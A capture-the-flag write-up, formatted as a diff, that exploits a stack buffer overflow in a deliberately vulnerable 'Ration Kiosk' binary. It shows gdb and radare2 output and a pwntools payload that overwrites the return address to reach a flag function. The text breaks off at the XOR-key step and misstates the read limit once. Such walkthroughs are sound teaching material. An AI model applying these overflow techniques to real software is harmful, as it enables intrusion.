@@ -1,0 +1,342 @@
+= Ration Kiosk
+
+== Challenge's context
+
+[quote]
+A food-ration distribution kiosk accepts requests over standard input.
+It is a statically linked binary with no modern exploit mitigations.
+Somewhere inside the binary is a function that decrypts and prints the flag.
+The normal request-handling path never calls it.
+The function expects two arguments that are stored as globals.
+The kiosk reads your input into a fixed-size buffer.
+
+From this we know there's probably a stack overflow that should allow us to call a function that decrypts and prints the flag.
+This function takes global variables as arguments.
+
+== Reconnaissance
+
+----
+$ file Ration_Kiosk
+Ration_Kiosk: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, with debug_info, not stripped
+----
+
+It's a 64-bit binary, statically linked (we already knew this) and it contains debug symbols, which can help us.
+
+What's the binary's behaviour?
+It shows a prompt and echoes what we write to it:
+
+----
+$ ./Ration_Kiosk 
+kiosk> test
+Acknowledged household: test
+----
+
+== Determining the overflow
+
+----
+$ pwn cyclic 200 | ./Ration_Kiosk
+kiosk> Acknowledged household: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa�
+Segmentation fault         (core dumped) pwn cyclic 200 | ./Ration_Kiosk
+----
+
+Passing 200 characters as input we see only ~70 were printed back and that the program segfaulted.
+
+Let's run the program with GDB:
+
+----
+$ gdb -q Ration_Kiosk
+Reading symbols from Ration_Kiosk...
+(gdb) r
+Starting program: Ration_Kiosk 
+
+kiosk> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+Acknowledged household: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa�
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401936 in handle_request ()
+----
+
+Now let's check the register values when it crashed:
+
+----
+(gdb) info reg
+rax            0x62                98
+rbx            0x7fffffffe0b8      140737488347320
+rcx            0x0                 0
+rdx            0x0                 0
+rsi            0x7fffffffbd60      140737488338272
+rdi            0x7fffffffbc40      140737488337984
+rbp            0x6161617661616175  0x6161617661616175
+rsp            0x7fffffffded8      0x7fffffffded8
+...
+rip            0x401936            0x401936 <handle_request+124>
+...
+----
+
+From this we can recognise the 0x616161 pattern in RBP matches part of the string we wrote to the prompt.
+So we know that we overflowed the buffer and wrote to a location whose value was loaded to RBP.
+
+What's the string offset that got written written to RBP?
+
+----
+$ pwn cyclic -l 0x6161617661616175
+80
+----
+
+== Disasembling
+
+----
+$ r2 Ration_Kiosk
+[0x00401690]> s main 
+[0x00401937]> aa
+INFO: Analyze all flags starting with sym. and entry0 (aa)
+INFO: Analyze imports (af@@@i)
+INFO: Analyze entrypoint (af@ entry0)
+INFO: Analyze symbols (af@@@s)
+INFO: Recovering variables (afva@@F)
+INFO: Running plugin pre-analysis hooks
+WARN: Variable 'anal.plugins.pre' not found
+INFO: Analyze all functions arguments/locals (afva@@F)
+[0x00401937]> pdf
+            ; DATA XREF from entry0 @ 0x4016a4(r)
+┌ 101: int main (int argc, char **argv, char **envp);
+│           0x00401937      55             push rbp
+│           0x00401938      4889e5         mov rbp, rsp
+│           0x0040193b      bab5174000     mov edx, loc.admin_audit    ; 0x4017b5 ; "_\xc3^\xc3UH\x89\xe5H\x83 ...
+│           0x00401940      b8efbeadde     mov eax, 0xdeadbeef
+│           0x00401945      4839c2         cmp rdx, rax
+│       ┌─< 0x00401948      750a           jne 0x401954
+│       │   0x0040194a      bf74e04700     mov edi, str.unreachable    ; 0x47e074 ; "unreachable"
+│       │   0x0040194f      e80cee0000     call sym.puts               ; int puts(const char *s)
+│       └─> 0x00401954      488b05b58e..   mov rax, qword [obj.stdout] ; [0x4aa810:8]=0x4aa460 obj._IO_2_1_stdout_ ; "`\xa4J"
+│           0x0040195b      b900000000     mov ecx, 0
+│           0x00401960      ba02000000     mov edx, 2
+│           0x00401965      be00000000     mov esi, 0
+│           0x0040196a      4889c7         mov rdi, rax
+│           0x0040196d      e88eef0000     call sym.setvbuf            ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x00401972      488b058f8e..   mov rax, qword [obj.stderr] ; [0x4aa808:8]=0x4aa280 obj._IO_2_1_stderr_
+│           0x00401979      b900000000     mov ecx, 0
+│           0x0040197e      ba02000000     mov edx, 2
+│           0x00401983      be00000000     mov esi, 0
+│           0x00401988      4889c7         mov rdi, rax
+│           0x0040198b      e870ef0000     call sym.setvbuf            ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
+│           0x00401990      e825ffffff     call sym.handle_request
+│           0x00401995      b800000000     mov eax, 0
+│           0x0040199a      5d             pop rbp
+└           0x0040199b      c3             ret
+----
+
+We see `main()` compares two values and prints "unreachable" if they match.
+It also sets some buffer options.
+Other that that, it calls `handle_request()`, which is the function mentioned in RIP's value in GBD's output when we overflowed the buffer.
+
+What does `handle_request()` do?
+
+----
+[0x00401937]> s sym.handle_request 
+[0x004018ba]> pdf
+            ; CALL XREF from main @ 0x401990(x)
+┌ 125: sym.handle_request ();
+│ afv: vars(2:sp[0x10..0x58])
+│           0x004018ba      55             push rbp
+│           0x004018bb      4889e5         mov rbp, rsp
+│           0x004018be      4883ec50       sub rsp, 0x50
+│           0x004018c2      ba07000000     mov edx, 7
+│           0x004018c7      be50e04700     mov esi, 0x47e050           ; "kiosk> "
+│           0x004018cc      bf01000000     mov edi, 1
+│           0x004018d1      e8ba700300     call sym.__write            ; ssize_t write(int fd, const char *ptr, size_t nbytes)
+│           0x004018d6      488d45b0       lea rax, [var_50h]
+│           0x004018da      ba00040000     mov edx, 0x400              ; 1024
+│           0x004018df      4889c6         mov rsi, rax
+│           0x004018e2      bf00000000     mov edi, 0
+│           0x004018e7      e804700300     call sym.__read             ; ssize_t read(int fildes, void *buf, size_t nbyte)
+│           0x004018ec      488945f8       mov qword [var_8h], rax
+│           0x004018f0      48837df800     cmp qword [var_8h], 0
+│       ┌─< 0x004018f5      783d           js 0x401934
+│       │   0x004018f7      48837df800     cmp qword [var_8h], 0
+│      ┌──< 0x004018fc      7e1e           jle 0x40191c
+│      ││   0x004018fe      488b45f8       mov rax, qword [var_8h]
+│      ││   0x00401902      4883e801       sub rax, 1
+│      ││   0x00401906      0fb64405b0     movzx eax, byte [rbp + rax - 0x50]
+│      ││   0x0040190b      3c0a           cmp al, 0xa                 ; 10
+│     ┌───< 0x0040190d      750d           jne 0x40191c
+│     │││   0x0040190f      488b45f8       mov rax, qword [var_8h]
+│     │││   0x00401913      4883e801       sub rax, 1
+│     │││   0x00401917      c64405b000     mov byte [rbp + rax - 0x50], 0
+│     └└──> 0x0040191c      488d45b0       lea rax, [var_50h]
+│       │   0x00401920      4889c6         mov rsi, rax
+│       │   0x00401923      bf58e04700     mov edi, str.Acknowledged_household:__s_n ; 0x47e058 ; "Acknowledged household: %s\n"
+│       │   0x00401928      b800000000     mov eax, 0
+│       │   0x0040192d      e8be890000     call sym.__printf
+│      ┌──< 0x00401932      eb01           jmp 0x401935
+│      │└─> 0x00401934      90             nop
+│      │    ; CODE XREF from sym.handle_request @ 0x401932(x)
+│      └──> 0x00401935      c9             leave
+└           0x00401936      c3             ret
+----
+
+. reserves 0x50 (80) bytes on the stack (`sub rsp, 0x50`)
+. writes the `kiosk>` prompt
+. reads our input
+. echoes our input
+. returns to `main`
+
+Our input is read to the 80-byte reserved space on the stack.
+`read()` is called with a limit of 0x4000 (1024 bytes), more than the 80 reserved bytes.
+That's the overflow vulnerability.
+
+== What's being overwritten?
+
+After `call handle_request` in `main()` and reserving the 80 bytes, the stack looks as follows:
+
+----
+|                 | 
+|-----------------|
+| Next RIP @ main |  |
+|-----------------|  | stack
+|  RBP from main  |  | growth
+|-----------------|  |
+|                 |  v
+| 80-byte buffer  |
+|                 |
+|-----------------|
+----
+
+So the overflow will first overwrite ``main``'s saved RBP and RIP.
+Then, when `leave` (equivalent to `mov rsp, rbp; pop rbp`) is executed, the stack pointer is restored (freeing the 80 bytes), and the ``main``'s RBP is restored form the stack to RBP.
+This explains why in GDB we saw part of the overflow string in RBP.
+
+The overflow next overwrites the saved RIP.
+When `ret` is executed we end up jumping to an address controlled by us.
+Since previously we wrote an invalid (non-mapped) address to it (part of the string), the program can no longer continue and it segfaults.
+If we write a valid address, we can control the execution's flow.
+
+== Where's the flag function?
+
+The challenge's context mentions there's a function that decrypts and prints the flag.
+We have to look around for it.
+
+What I did was I opened the binary in `radare2` and explored a bit in visual mode.
+Above `main()` and `handle_request()` I found `give_flag()`:
+
+----
+┌ 257: sym.give_flag (int64_t arg1, int64_t arg2); // noreturn
+│ `- args(rdi, rsi) vars(12:sp[0xc..0x78])
+│           0x004017b9      55             push rbp
+│           0x004017ba      4889e5         mov rbp, rsp
+│           0x004017bd      4883ec70       sub rsp, 0x70
+│           0x004017c1      48897d98       mov qword [var_68h], rdi    ; arg1
+│           0x004017c5      48897590       mov qword [var_70h], rsi    ; arg2
+│           0x004017c9      488b4598       mov rax, qword [var_68h]
+│           0x004017cd      488945e0       mov qword [var_20h], rax
+│           0x004017d1      488d45e0       lea rax, [var_20h]
+│           0x004017d5      4883c008       add rax, 8
+│           0x004017d9      488b5590       mov rdx, qword [var_70h]
+│           0x004017dd      488910         mov qword [rax], rdx
+│           0x004017e0      48c745a000..   mov qword [var_60h], 0
+│           0x004017e8      48c745a800..   mov qword [var_58h], 0
+│           0x004017f0      48c745b000..   mov qword [var_50h], 0
+│           0x004017f8      48c745b800..   mov qword [var_48h], 0
+│           0x00401800      48c745c000..   mov qword [var_40h], 0
+│           0x00401808      48c745c800..   mov qword [var_38h], 0
+│           0x00401810      c645d000       mov byte [var_30h], 0
+│           0x00401814      c745fc0000..   mov dword [var_4h], 0
+│       ┌─< 0x0040181b      eb28           jmp 0x401845
+│      ┌──> 0x0040181d      8b45fc         mov eax, dword [var_4h]
+│      ╎│   0x00401820      4898           cdqe
+│      ╎│   0x00401822      0fb69020e0..   movzx edx, byte [rax + obj.flag_ct]
+│      ╎│   0x00401829      8b45fc         mov eax, dword [var_4h]
+│      ╎│   0x0040182c      83e00f         and eax, 0xf                ; 15
+│      ╎│   0x0040182f      4898           cdqe
+│      ╎│   0x00401831      0fb64405e0     movzx eax, byte [rbp + rax - 0x20]
+│      ╎│   0x00401836      31c2           xor edx, eax
+│      ╎│   0x00401838      8b45fc         mov eax, dword [var_4h]
+│      ╎│   0x0040183b      4898           cdqe
+│      ╎│   0x0040183d      885405a0       mov byte [rbp + rax - 0x60], dl
+│      ╎│   0x00401841      8345fc01       add dword [var_4h], 1
+│      ╎│   ; CODE XREF from sym.give_flag @ 0x40181b(x)
+│      ╎└─> 0x00401845      837dfc2f       cmp dword [var_4h], 0x2f    ; '/'
+│      └──< 0x00401849      7ed2           jle 0x40181d
+│           0x0040184b      c745f83000..   mov dword [var_8h], 0x30    ; '0' ; 48
+│       ┌─< 0x00401852      eb04           jmp 0x401858
+│      ┌──> 0x00401854      836df801       sub dword [var_8h], 1
+│      ╎│   ; CODE XREF from sym.give_flag @ 0x401852(x)
+│      ╎└─> 0x00401858      837df800       cmp dword [var_8h], 0
+│      ╎┌─< 0x0040185c      7e11           jle 0x40186f
+│      ╎│   0x0040185e      8b45f8         mov eax, dword [var_8h]
+│      ╎│   0x00401861      83e801         sub eax, 1
+│      ╎│   0x00401864      4898           cdqe
+│      ╎│   0x00401866      0fb64405a0     movzx eax, byte [rbp + rax - 0x60]
+│      ╎│   0x0040186b      84c0           test al, al
+│      └──< 0x0040186d      74e5           je 0x401854
+│       └─> 0x0040186f      488b0d9a8f..   mov rcx, qword [obj.stdout] ; [0x4aa810:8]=0x4aa460 obj._IO_2_1_stdout_ ; "`\xa4J"
+│           0x00401876      8b45f8         mov eax, dword [var_8h]
+│           0x00401879      4863d0         movsxd rdx, eax
+│           0x0040187c      488d45a0       lea rax, [var_60h]
+│           0x00401880      be01000000     mov esi, 1
+│           0x00401885      4889c7         mov rdi, rax
+│           0x00401888      e823ec0000     call sym._IO_fwrite
+│           0x0040188d      488b057c8f..   mov rax, qword [obj.stdout] ; [0x4aa810:8]=0x4aa460 obj._IO_2_1_stdout_ ; "`\xa4J"
+│           0x00401894      4889c6         mov rsi, rax
+│           0x00401897      bf0a000000     mov edi, 0xa
+│           0x0040189c      e89f0f0100     call sym.fputc              ; int fputc(int c, FILE *stream)
+│           0x004018a1      488b05688f..   mov rax, qword [obj.stdout] ; [0x4aa810:8]=0x4aa460 obj._IO_2_1_stdout_ ; "`\xa4J"
+│           0x004018a8      4889c7         mov rdi, rax
+│           0x004018ab      e8d0e90000     call sym._IO_fflush
+│           0x004018b0      bf00000000     mov edi, 0
+└           0x004018b5      e886660300     call sym._Exit              ; void _Exit(int status)
+----
+
+I'll leave the reversing details up to the reader.
+Main observations:
+
+* Receives two arguments, in RDI and RSI
+* Progressively loads bytes from `obj.flag_ct`, which I assume means "flag ciphertext" (!!)
+* XORs the `flag_ct` bytes with those from the function arguments and stores the results to memory
+* Prints that result to stdout
+
+So... We want to call this function so that it decrypts an prints the flag.
+
+== Calling `give_flag()`
+
+All we need to do is overwrite ``main()``'s stored RIP on the stack with the address from `give_flag()` so that when `ret` is executed in `handle_request()` we jump to `give_flag()` rather than `main`.
+
+----
+$ python
+>>> from pwnlib.util.packing import *
+>>> b =  p8(0)*80          # buffer
+>>> b += p64(0)            # rbp
+>>> b += p64(0x004017b9)   # rip
+>>> open("payload.raw", "wb").write(b)
+----
+
+With that, the stack will contain:
+
+----
+|                 | 
+|-----------------|
+|    give_flag    |  |
+|-----------------|  | stack
+|       0x0       |  | growth
+|-----------------|  |
+|                 |  v
+| 80-byte buffer  |
+|  (zero filled)  |
+|-----------------|
+----
+
+Let's try the overflow:
+
+----
+$ ./Ration_Kiosk < payload.raw 
+kiosk> Acknowledged household: 
+�����(�N�h�ᆧ�D�*T��m��ԯ�"��m�v�[
+----
+
+* The program no longer segfaults
+* But it prints some gibberish, not the flag
+** This is natural... because we XORed `flag_ct` with unspecified RDI and RSI arguments
+
+== What do we XOR with?
+
+
